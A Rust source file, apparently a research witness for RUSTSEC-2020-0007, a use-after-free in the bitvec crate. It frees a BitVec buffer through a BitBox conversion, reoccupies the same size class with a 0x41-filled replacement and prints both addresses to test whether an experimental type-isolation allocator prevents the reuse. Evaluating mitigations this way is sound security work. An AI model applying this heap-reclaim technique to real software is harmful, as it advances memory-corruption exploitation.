//! Derived A -> free -> B adapter for RUSTSEC-2020-0007.
//!
//! This is separately labeled from the published witness. With ASan quarantine
//! disabled, the replacement has the same 1016-byte size class as the old
//! bitvec allocation. The treatment-relevant oracle is address collision;
//! clean exit alone never establishes that Type Isolation fixed the defect.

use bitvec::prelude::*;
use std::hint::black_box;

const VICTIM_TYPE_ID: u64 = 0x5253_4802_0000_0001;
const VICTIM_MODULE_ID: u64 = 0x5253_4802_0000_0002;
const VICTIM_ALLOC_CALLSITE: u64 = 0x5253_4802_0000_0003;
const VICTIM_RECLAIM_CALLSITE: u64 = 0x5253_4802_0000_0004;

// These hooks are no-ops in the standalone pinned witness. The allocator
// experiment wrapper supplies the explicitly labeled semantic identity scope
// and the immediate denial report. Keeping the adapter runnable on its own
// preserves the system/ASan ground-truth path.
pub(crate) fn with_vulnerability_edge_identity<R>(
    _type_id: u64,
    _module_id: u64,
    _callsite: u64,
    f: impl FnOnce() -> R,
) -> R {
    f()
}

pub(crate) fn report_vulnerability_edge_reuse_denial() {}

#[repr(align(8))]
struct Replacement([usize; 127]);

fn main() {
    let mut bits = crate::with_vulnerability_edge_identity(
        VICTIM_TYPE_ID,
        VICTIM_MODULE_ID,
        VICTIM_ALLOC_CALLSITE,
        || BitVec::with_capacity(8065),
    );
    bits.push(false);
    let original_address = bits.as_slice().as_ptr() as *const () as usize;
    let boxed: BitBox = crate::with_vulnerability_edge_identity(
        VICTIM_TYPE_ID,
        VICTIM_MODULE_ID,
        VICTIM_RECLAIM_CALLSITE,
        || bits.into(),
    );

    let replacement = Box::new(Replacement([0x4141_4141_4141_4141; 127]));
    crate::report_vulnerability_edge_reuse_denial();
    let replacement_address = (&*replacement as *const Replacement) as usize;
    eprintln!("original={original_address:#x} replacement={replacement_address:#x}");
    black_box(&replacement.0);

    drop(boxed);
    drop(replacement);
}
